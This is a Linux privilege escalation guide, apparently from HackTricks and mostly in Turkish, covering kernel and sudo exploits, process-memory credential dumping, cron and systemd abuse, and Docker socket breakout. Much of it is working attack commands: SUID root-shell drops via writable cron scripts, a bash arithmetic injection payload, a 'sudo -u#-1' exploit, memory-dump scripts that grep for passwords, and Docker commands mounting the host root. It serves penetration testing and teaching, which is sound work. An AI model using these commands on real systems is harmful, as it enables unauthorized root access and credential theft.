# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Sistem Bilgileri

### OS bilgisi

Çalışan işletim sistemi hakkında bilgi edinmeye başlayalım
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Eğer **`PATH` değişkenindeki herhangi bir klasöre yazma izniniz varsa** bazı libraries veya binaries'i hijack edebilirsiniz:
```bash
echo $PATH
```
### Ortam bilgileri

Ortam değişkenlerinde ilginç bilgiler, şifreler veya API anahtarları var mı?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kernel sürümünü kontrol et ve escalate privileges elde etmek için kullanılabilecek bir exploit olup olmadığını kontrol et
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
İyi bir vulnerable kernel listesi ve bazı zaten **compiled exploits**'leri şurada bulabilirsiniz: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) ve [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Diğer sitelerden bazı **compiled exploits**'leri bulabileceğiniz yerler: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Bu siteden tüm vulnerable kernel versiyonlarını çıkarmak için şunu yapabilirsiniz:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Kernel exploit aramak için yardımcı olabilecek araçlar şunlardır:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (hedef üzerinde çalıştırın, sadece kernel 2.x için exploit'leri kontrol eder)

Her zaman **kernel sürümünü Google'da arayın**, belki kernel sürümünüz bazı kernel exploit'lerinde yazılıdır ve böylece bu exploit'in geçerli olduğundan emin olursunuz.

Ek kernel exploitation tekniği:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo sürümü

Aşağıda görünen zafiyetli sudo sürümlerine dayanarak:
```bash
searchsploit sudo
```
Bu grep'i kullanarak sudo sürümünün açık olup olmadığını kontrol edebilirsiniz.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo'nun 1.9.17p1'den önceki sürümleri (**1.9.14 - 1.9.17 < 1.9.17p1**) yetkisiz yerel kullanıcıların, `/etc/nsswitch.conf` dosyası kullanıcı kontrollü bir dizinden kullanıldığında sudo `--chroot` seçeneği aracılığıyla root ayrıcalıklarına yükselmesine izin verir.

İşte o [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463)u istismar etmek için bir [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot). Exploit'i çalıştırmadan önce `sudo` sürümünüzün etkilendiğinden ve `chroot` özelliğini desteklediğinden emin olun.

Daha fazla bilgi için orijinal [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)e bakın.

#### sudo < v1.8.28

Kaynak: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg imza doğrulaması başarısız

Bu vuln'un nasıl exploited edilebileceğine dair bir **örnek** için **smasher2 box of HTB**'ye bakın.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Daha fazla system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Olası savunmaları listeleme

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Eğer bir docker container içindeyseniz, ondan kaçmayı deneyebilirsiniz:


{{#ref}}
docker-security/
{{#endref}}

## Sürücüler

**what is mounted and unmounted**, nerede ve neden olduğunu kontrol edin. Eğer herhangi bir şey unmounted ise, onu mount etmeyi deneyebilir ve özel bilgileri kontrol edebilirsiniz.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Kullanışlı yazılımlar

Kullanışlı binaries'leri listeleyin
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Ayrıca, **herhangi bir compiler'ın yüklü olup olmadığını kontrol edin**. Bu, bazı kernel exploit'leri kullanmanız gerekirse faydalıdır çünkü bunları kullanacağınız makinede (veya benzer birinde) compile etmeniz önerilir.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Yüklenmiş Zayıf Yazılımlar

Yüklü paketlerin ve servislerin **sürümünü** kontrol edin. Belki eski bir Nagios sürümü (örneğin) vardır; bu, escalating privileges için exploit edilebilir…\
Daha şüpheli görünen yüklü yazılımların sürümlerini manuel olarak kontrol etmeniz önerilir.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Makineye SSH erişiminiz varsa, içinde yüklü olan güncel olmayan ve güvenlik açığı bulunan yazılımları kontrol etmek için **openVAS**'ı da kullanabilirsiniz.

> [!NOTE] > _Bu komutlar büyük ölçüde işe yaramayan çok fazla bilgi gösterecektir; bu nedenle kurulu yazılım sürümlerinin bilinen exploit'lere karşı savunmasız olup olmadığını kontrol edecek OpenVAS veya benzeri uygulamalar önerilir._

## Processes

Hangi işlemlerin çalıştırıldığını inceleyin ve herhangi bir işlemin **olması gerekenden daha fazla ayrıcalığa** sahip olup olmadığını kontrol edin (örneğin bir tomcat'in root tarafından çalıştırılıyor olması?).
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Ayrıca **check your privileges over the processes binaries**, belki birinin üzerine yazabilirsiniz.

### Süreç izleme

Süreçleri izlemek için [**pspy**](https://github.com/DominicBreuker/pspy) gibi araçları kullanabilirsiniz. Bu, sıkça çalıştırılan veya bir dizi gereksinim karşılandığında tetiklenen zayıf süreçleri tespit etmek için çok faydalı olabilir.

#### Süreç belleği

Bir sunucunun bazı servisleri **credentials in clear text inside the memory** olarak bilgileri bellekte saklayabilir.\
Normalde diğer kullanıcılara ait süreçlerin belleklerini okumak için **root privileges** gerekir; bu yüzden bu genellikle zaten root olduğunuzda ve daha fazla credential keşfetmek istediğinizde daha faydalıdır.\
Ancak unutmayın ki **as a regular user you can read the memory of the processes you own**.

> [!WARNING]
> Günümüzde çoğu makine **ptrace'e varsayılan olarak izin vermez**, bu da yetkisiz kullanıcınıza ait diğer süreçleri dumplayamayacağınız anlamına gelir.
>
> _**/proc/sys/kernel/yama/ptrace_scope**_ dosyası ptrace erişilebilirliğini kontrol eder:
>
> - **kernel.yama.ptrace_scope = 0**: aynı uid'ye sahip olduğu sürece tüm süreçler debug edilebilir. Bu, ptracing'in klasik çalışma şeklidir.
> - **kernel.yama.ptrace_scope = 1**: yalnızca bir parent process debug edilebilir.
> - **kernel.yama.ptrace_scope = 2**: ptrace yalnızca admin tarafından kullanılabilir, çünkü CAP_SYS_PTRACE yeteneği gerektirir.
> - **kernel.yama.ptrace_scope = 3**: Hiçbir süreç ptrace ile izlenemez. Bir kez ayarlandığında, ptracing'i tekrar etkinleştirmek için reboot gerekir.

#### GDB

Örneğin bir FTP servisinin belleğine erişiminiz varsa Heap'i alıp içindeki credential'ları arayabilirsiniz.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Belirli bir process ID için, **maps**, işlemin sanal adres alanı içinde belleğin nasıl eşlendiğini gösterir; ayrıca **her eşlenen bölgenin izinlerini** de gösterir. Sahte dosya **mem**, işlemin belleğini bizzat ortaya koyar. **maps** dosyasından hangi **bellek bölgelerinin okunabilir** olduğunu ve onların offset'lerini biliriz. Bu bilgiyi kullanarak **mem dosyasında seek yapar ve tüm okunabilir bölgeleri dump ederiz**.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` sistemin **fiziksel** belleğine erişim sağlar, sanal belleğe değil. Çekirdeğin sanal adres alanına /dev/kmem üzerinden erişilebilir.\
Genellikle, `/dev/mem` yalnızca **root** ve **kmem** grubu tarafından okunabilir.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump, Windows için Sysinternals araç paketindeki klasik ProcDump aracının Linux için yeniden tasarlanmış halidir. Edinin: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Araçlar

Bir işlemin belleğini dökmek için şunları kullanabilirsiniz:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Root gereksinimlerini manuel olarak kaldırabilir ve size ait olan işlemi dökebilirsiniz
- Script A.5 şuradan: [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root gereklidir)

### İşlem Belleğinden Kimlik Bilgileri

#### Manuel örnek

Eğer authenticator işlemi çalışıyorsa:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Process'i dump edebilir (bir process'in memory'sini dump etmenin farklı yollarını bulmak için önceki bölümlere bakın) ve memory'de credentials arayabilirsiniz:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Araç [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **bellekteki açık metin kimlik bilgilerini** ve bazı **iyi bilinen dosyalardaki** kimlik bilgilerini çalar. Doğru çalışması için root ayrıcalıkları gerektirir.

| Özellik                                           | İşlem Adı            |
| ------------------------------------------------- | -------------------- |
| GDM parolası (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Aktif FTP Bağlantıları)                   | vsftpd               |
| Apache2 (Aktif HTTP Basic Auth Oturumları)        | apache2              |
| OpenSSH (Aktif SSH Oturumları - Sudo Kullanımı)   | sshd:                |

#### Arama Regexleri/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zamanlanmış/Cron görevleri

### Crontab UI (alseambusher) root olarak çalışıyorsa – web tabanlı zamanlayıcı privesc

Eğer web “Crontab UI” paneli (alseambusher/crontab-ui) root olarak çalışıyor ve yalnızca loopback'e bağlıysa, SSH local port-forwarding ile yine de ona ulaşabilir ve privesc için ayrıcalıklı bir iş oluşturabilirsiniz.

Tipik zincir
- Loopback'e özel portu keşfedin (örn. 127.0.0.1:8000) ve Basic-Auth realm'ini `ss -ntlp` / `curl -v localhost:8000` ile bulun
- Operasyonel artefaktlarda kimlik bilgilerini bulun:
- Yedekler/skriptler: `zip -P <password>`
- systemd unit'ında `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` içeren unit'lar
- Tünelle ve giriş yap:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Yüksek ayrıcalıklı bir job oluştur ve hemen çalıştır (SUID shell bırakır):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Kullan:
```bash
/tmp/rootshell -p   # root shell
```
Sertleştirme
- Crontab UI'yi root olarak çalıştırmayın; özel bir kullanıcı ve minimum izinlerle kısıtlayın
- localhost'a bağlayın ve ayrıca erişimi firewall/VPN ile kısıtlayın; parolaları yeniden kullanmayın
- unit files içinde secret gömmekten kaçının; secret stores veya sadece root'un erişebildiği EnvironmentFile kullanın
- İstek üzerine çalışan job'lar için audit/logging'i etkinleştirin

Zamanlanmış job'ların herhangi birinin zafiyeti olup olmadığını kontrol edin. Belki root tarafından çalıştırılan bir script'ten faydalanabilirsiniz (wildcard vuln? root'un kullandığı dosyaları değiştirebilir misiniz? symlinks kullanmak? root'un kullandığı dizinde belirli dosyalar oluşturmak?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron yolu

Örneğin, _/etc/crontab_ içinde PATH'i bulabilirsiniz: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Kullanıcı "user"ın /home/user üzerinde yazma ayrıcalığına sahip olduğuna dikkat edin_)

Eğer bu crontab içinde root kullanıcısı PATH'i ayarlamadan bir komut veya script çalıştırmaya çalışıyorsa. Örneğin: _\* \* \* \* root overwrite.sh_\
Böylece, şu komutu kullanarak root shell elde edebilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

Eğer root tarafından çalıştırılan bir script'in bir komutunda “**\***” varsa, bunu beklenmeyen sonuçlar (ör. privesc) elde etmek için kullanabilirsiniz. Örnek:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Eğer wildcard bir yolun önünde yer alıyorsa, örneğin** _**/some/path/\***_ **, zafiyet bulunmaz (hatta** _**./\***_ **de bulunmaz).**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash, ((...)), $((...)) ve let içindeki arithmetic evaluation'dan önce parameter expansion ve command substitution uygular. Eğer bir root cron/parser güvensiz log alanlarını okur ve bunları bir arithmetic context'e geçirirse, bir attacker command substitution $(...) enjekte edebilir ve cron çalıştığında bu root olarak çalışır.

- Neden işe yarıyor: Bash'te expansions şu sırayla gerçekleşir: parameter/variable expansion, command substitution, arithmetic expansion, ardından word splitting ve pathname expansion. Bu yüzden `$(/bin/bash -c 'id > /tmp/pwn')0` gibi bir değer önce substitute edilir (komut çalıştırılır), sonra kalan sayısal `0` arithmetic için kullanılır ve script hatasız devam eder.

- Tipik vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Parsed log'a attacker-controlled metin yazdırın, böylece sayısal görünen alan command substitution içerir ve bir rakamla biter. Komutunuzun stdout'a yazmadığından emin olun (veya yönlendirin) ki arithmetic geçerli kalsın.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Eğer root tarafından çalıştırılan script, sizin tam erişiminizin olduğu bir **directory** kullanıyorsa, o folder'ı silmek ve **başka bir folder'a symlink oluşturmak** sizin kontrolünüzdeki bir script'i barındıracak şekilde faydalı olabilir.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Sık cron jobs

Süreçleri, her 1, 2 veya 5 dakikada bir çalıştırılan işlemleri aramak için izleyebilirsiniz. Belki bundan faydalanıp yetki yükseltmeyi başarabilirsiniz.

Örneğin, **1 dakika boyunca her 0.1s'de izlemek**, **en az çalıştırılan komutlara göre sıralamak** ve en çok çalıştırılan komutları silmek için şu komutu kullanabilirsiniz:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ayrıca kullanabilirsiniz** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (bu, başlayan her işlemi izleyecek ve listeleyecektir).

### Görünmez cronjob'lar

Bir cronjob oluşturmak mümkündür; bir yorumdan sonra (yeni satır karakteri olmadan) **carriage return koyarak** yapılabilir ve cron job çalışacaktır. Örnek (carriage return karakterine dikkat):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servisler

### Yazılabilir _.service_ dosyaları

Herhangi bir `.service` dosyası yazıp yazamayacağını kontrol et; yazabiliyorsan, bunu **değiştirip** servisin **başlatıldığında**, **yeniden başlatıldığında** veya **durdurulduğunda** **backdoor**'unun **çalıştırılmasını** sağlayabilirsin (belki makinenin yeniden başlatılmasını beklemen gerekir).  
Örneğin `.service` dosyasının içine **`ExecStart=/tmp/script.sh`** yazarak backdoor oluştur.

### Yazılabilir servis ikili dosyaları

Aklında bulundur ki eğer **servisler tarafından çalıştırılan ikili dosyalar üzerinde yazma izinlerine** sahipsen, bunları backdoor amaçlı değiştirebilirsin; böylece servisler yeniden çalıştırıldığında backdoorlar yürütülür.

### systemd PATH - Göreli Yollar

Kullanılan PATH'i **systemd** tarafından şu komutla görebilirsin:
```bash
systemctl show-environment
```
Eğer yolun herhangi bir klasörüne **write** yapabildiğinizi tespit ederseniz, **escalate privileges** yapabiliyor olabilirsiniz. Servis yapılandırma dosyalarında kullanılan **göreli yolları** şu dosyalarda aramanız gerekir:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Sonra, yazma izniniz olan systemd PATH klasörünün içinde, göreli yol binary'siyle aynı ada sahip bir executable oluşturun ve servis zafiyetli işlemi (**Start**, **Stop**, **Reload**) gerçekleştirmesi istendiğinde, **backdoor'unuz çalıştırılacaktır** (yetkisiz kullanıcılar genellikle servisleri başlatıp/durduramazlar ama `sudo -l` kullanıp kullanamayacağınızı kontrol edin).

**Servisler hakkında daha fazla bilgi için `man systemd.service`'e bakın.**

## **Zamanlayıcılar**

**Zamanlayıcılar**, adı `**.timer**` ile biten ve `**.service**` dosyalarını veya olayları kontrol eden systemd unit dosyalarıdır. **Zamanlayıcılar**, takvim zamanlı olaylar ve monotonic zaman olayları için yerleşik desteğe sahip oldukları ve eşzamansız olarak çalıştırılabildikleri için cron'a bir alternatif olarak kullanılabilir.

Tüm zamanlayıcıları şu komutla listeleyebilirsiniz:
```bash
systemctl list-timers --all
```
### Yazılabilir zamanlayıcılar

Eğer bir zamanlayıcıyı değiştirebiliyorsanız, mevcut bir systemd.unit biriminin (ör. `.service` veya `.target`) çalıştırılmasını sağlayabilirsiniz.
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> Bir timer sona erdiğinde etkinleştirilecek unit. Argüman, son eki ".timer" olmayan bir unit adıdır. Belirtilmemişse, bu değer varsayılan olarak timer birimi ile aynı ada sahip olan, sadece son eki farklı olan bir service olur. (Yukarıya bakın.) Etkinleştirilen unit adı ile timer biriminin adı, yalnızca son ek dışında aynı isimde olmaları önerilir.

Therefore, to abuse this permission you would need to:

- Sistem üzerinde bazı systemd unit'leri (örn. `.service`) bulun ve **yazılabilir bir binary çalıştırıyor** olmalarına dikkat edin
- Göreceli bir yol **çalıştıran** bir systemd unit'i bulun ve bu yürütülebilir dosyayı taklit etmek için **systemd PATH** üzerinde **yazma ayrıcalıklarına** sahip olun

**Learn more about timers with `man systemd.timer`.**

### **Timer Etkinleştirme**

Bir timer'ı etkinleştirmek için root ayrıcalıklarına sahip olmanız ve şu komutu çalıştırmanız gerekir:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) istemci-sunucu modellerinde aynı veya farklı makinelerde **proses iletişimini** sağlar. Bilgisayarlar arası iletişim için standart Unix descriptor dosyalarını kullanır ve `.socket` dosyalarıyla yapılandırılır.

Sockets `.socket` dosyaları kullanılarak yapılandırılabilir.

**Learn more about sockets with `man systemd.socket`.** Bu dosya içinde, yapılandırılabilecek birkaç ilginç parametre vardır:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Bu seçenekler farklıdır ama özet olarak **nereden dinleyeceğini belirtmek** için kullanılır (AF_UNIX soket dosyasının yolu, dinlenecek IPv4/6 ve/veya port numarası vb.).
- `Accept`: Boolean bir argüman alır. Eğer **true** ise, her gelen bağlantı için bir **service instance** başlatılır ve yalnızca bağlantı soketi ona iletilir. Eğer **false** ise, tüm dinleme soketleri başlatılan **service unit**'e **iletilebilir** ve tüm bağlantılar için yalnızca bir service unit oluşturulur. Bu değer, datagram soketleri ve FIFO'lar için göz ardı edilir; bu durumda tek bir service unit koşulsuz olarak tüm gelen trafiği işler. **Varsayılanı false'dur.** Performans nedenleriyle yeni daemon'ların yalnızca `Accept=no` için uygun şekilde yazılması tavsiye edilir.
- `ExecStartPre`, `ExecStartPost`: Bir veya daha fazla komut satırı alır; bunlar dinleme **sockets**/FIFO'lar **oluşturulmadan** ve bind edilmeden önce veya sonrasında sırasıyla **çalıştırılır**. Komut satırının ilk token'ı mutlak bir dosya adı olmalı, ardından süreç için argümanlar gelir.
- `ExecStopPre`, `ExecStopPost`: Dinleme **sockets**/FIFO'lar **kapatılmadan** ve kaldırılmadan önce veya sonra **çalıştırılan** ek **komutlar**.
- `Service`: **Gelen trafik** üzerine **aktive edilecek** service unit adını belirtir. Bu ayar sadece Accept=no olan socket'ler için izinlidir. Varsayılan olarak socket ile aynı ada sahip (sonek değiştirilen) service'i kullanır. Çoğu durumda bu seçeneği kullanmaya gerek yoktur.

### Writable .socket files

Eğer bir **yazılabilir** `.socket` dosyası bulursanız `[Socket]` bölümünün başına şuna benzer bir satır **ekleyebilirsiniz**: `ExecStartPre=/home/kali/sys/backdoor` ve backdoor soket oluşturulmadan önce çalıştırılacaktır. Bu nedenle **muhtemelen makinenin yeniden başlatılmasını beklemeniz gerekecektir.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

Eğer herhangi bir **yazılabilir socket** tespit ederseniz (_burada artık config `.socket` dosyalarından değil, Unix Sockets'ten bahsediyoruz_), o soketle **iletişim kurabilir** ve belki bir zafiyeti istismar edebilirsiniz.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Ham bağlantı
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**İstismar örneği:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Dikkat: bazı **sockets listening for HTTP** isteklerini dinliyor olabilir (_.socket dosyalarından değil, unix sockets olarak davranan dosyalardan bahsediyorum_). Bunu şu komutla kontrol edebilirsiniz:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Eğer socket **HTTP isteğine yanıt veriyorsa**, onunla **iletişim kurabilir** ve belki de **bazı zafiyetleri exploit** edebilirsiniz.

### Yazılabilir Docker Socket

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.

#### **Privilege Escalation with Docker CLI**

Docker socket'e yazma erişiminiz varsa, aşağıdaki komutları kullanarak privilege escalation gerçekleştirebilirsiniz:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Bu komutlar, host'un dosya sistemine root düzeyinde erişimi olan bir container çalıştırmanıza izin verir.

#### **Docker API'sini Doğrudan Kullanma**

Docker CLI mevcut değilse, Docker socket yine de Docker API ve `curl` komutları kullanılarak manipüle edilebilir.

1.  **List Docker Images:** Kullanılabilir images listesini alın.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Host sistemin kök dizinini mount eden bir container oluşturmak için istek gönderin.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Yeni oluşturulan container'ı başlatın:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` kullanarak container'a bağlantı kurun; bu, içinde komut çalıştırmanıza olanak sağlar.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

